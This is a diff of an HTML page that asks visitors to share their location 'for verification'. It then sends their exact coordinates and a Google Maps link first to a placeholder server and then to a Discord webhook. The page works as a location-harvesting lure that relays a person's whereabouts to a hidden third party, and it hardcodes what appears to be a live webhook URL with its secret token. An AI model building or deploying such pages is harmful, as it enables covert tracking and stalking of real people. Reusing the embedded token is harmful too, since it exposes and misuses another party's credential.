@@ -1,24 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><title>Location Verify</title></head>
+<head>
+  <title>Location Verification</title>
+</head>
 <body>
-<h2>Click below to share your location for verification</h2>
-<button onclick="getLocation()">Share Location</button>
-<script>
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    await fetch('https://yourserver.com/location', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ latitude: lat, longitude: lon })
-    });
-    alert("Location sent!");
-  }, () => {
-    alert("Location access denied.");
-  });
-}
-</script>
+  <h2>Click the button to share your location with Discord</h2>
+  <button onclick="sendLocation()">Send Location</button>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1379989806347452526/x-Nsnglyw0JcrRd4DMLPH9WYvBIGNpsgx7RA_eCTIDoDkqDmeK2rSbBe0KQdlfPOyL40'; // Replace with your webhook URL
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        const payload = {
+          content: `📍 **Location Received**\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${googleMapsLink})`
+        };
+
+        try {
+          const res = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          if (res.ok) {
+            alert("✅ Location sent to Discord!");
+          } else {
+            alert("❌ Failed to send location.");
+          }
+        } catch (err) {
+          console.error(err);
+          alert("⚠️ Error sending location.");
+        }
+      }, (err) => {
+        alert("❌ Permission denied or error getting location.");
+      });
+    }
+  </script>
 </body>
 </html>
